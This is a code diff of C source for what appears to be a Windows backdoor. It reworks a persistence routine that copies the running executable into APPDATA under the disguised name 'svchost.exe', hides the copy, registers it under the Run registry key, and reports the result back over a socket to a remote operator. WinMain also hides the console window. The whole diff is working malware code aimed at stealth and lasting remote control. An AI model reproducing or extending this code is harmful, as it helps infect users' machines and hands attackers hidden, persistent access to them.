@@ -16,57 +16,37 @@
 
 int sock;
 
-void copy_to_appdata() {
+int bootRun()
+{
     char appdata_path[MAX_PATH];
     char exe_path[MAX_PATH];
     char dest_path[MAX_PATH];
-    char command[MAX_PATH + 20];
+    char response[1024];
     
     GetModuleFileName(NULL, exe_path, MAX_PATH);
     GetEnvironmentVariable("APPDATA", appdata_path, MAX_PATH);
     
-    snprintf(dest_path, sizeof(dest_path), "%s\\sys.exe", appdata_path);
+    snprintf(dest_path, sizeof(dest_path), "%s\\svchost.exe", appdata_path);
     
     CopyFile(exe_path, dest_path, FALSE);
-    
-    snprintf(command, sizeof(command), "attrib +h \"%s\"", dest_path);
-    system(command);
+    SetFileAttributes(dest_path, FILE_ATTRIBUTE_HIDDEN);
     
     HKEY NewVal;
     if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) == ERROR_SUCCESS) {
         DWORD pathLenInBytes = strlen(dest_path) * sizeof(char);
-        RegSetValueEx(NewVal, TEXT("sys"), 0, REG_SZ, (LPBYTE)dest_path, pathLenInBytes);
+        if (RegSetValueEx(NewVal, TEXT("svchost"), 0, REG_SZ, (LPBYTE)dest_path, pathLenInBytes) == ERROR_SUCCESS) {
+            snprintf(response, sizeof(response), "Persistence created at: %s\n", dest_path);
+            send(sock, response, strlen(response), 0);
+        } else {
+            char err[] = "Failed to create persistence\n";
+            send(sock, err, sizeof(err), 0);
+        }
         RegCloseKey(NewVal);
-    }
-}
-
-int bootRun()
-{
-    char err[128] = "Failed\n";
-    char suc[128] = "Created Persistence At : HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n";
-    TCHAR szPath[MAX_PATH];
-    DWORD pathLen = 0;
-
-    pathLen = GetModuleFileName(NULL, szPath, MAX_PATH);
-    if (pathLen == 0) {
+    } else {
+        char err[] = "Failed to open registry key\n";
         send(sock, err, sizeof(err), 0);
-        return -1;
     }
-
-    HKEY NewVal;
-
-    if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS) {
-        send(sock, err, sizeof(err), 0);
-        return -1;
-    }
-    DWORD pathLenInBytes = pathLen * sizeof(*szPath);
-    if (RegSetValueEx(NewVal, TEXT("cyka"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS) {
-        RegCloseKey(NewVal);
-        send(sock, err, sizeof(err), 0);
-        return -1;
-    }
-    RegCloseKey(NewVal);
-    send(sock, suc, sizeof(suc), 0);
+    
     return 0;
 }
 
@@ -303,8 +283,6 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
     AllocConsole();
     stealth = FindWindowA("ConsoleWindowClass", NULL);
     ShowWindow(stealth, 0);
-
-    copy_to_appdata();
 
     struct sockaddr_in ServAddr;
     WSADATA wsaData;
